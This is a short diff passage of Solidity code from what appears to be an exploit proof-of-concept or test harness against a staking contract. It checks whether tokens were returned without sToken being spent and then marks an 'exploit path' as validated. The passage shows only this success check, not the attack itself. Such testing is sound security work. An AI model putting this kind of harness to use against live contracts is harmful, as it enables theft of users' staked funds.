+        uint256 sTokenAfter = IERC20Like(sToken).balanceOf(address(this));
+
+        if (tokenAfter > tokenBefore && sTokenAfter == sTokenBefore) {
+            unstakeWithoutSTokenResult = PathResult.Success;
+            hypothesisValidated = true;
+            exploitPathUsed = 2;
+            return;
+        }
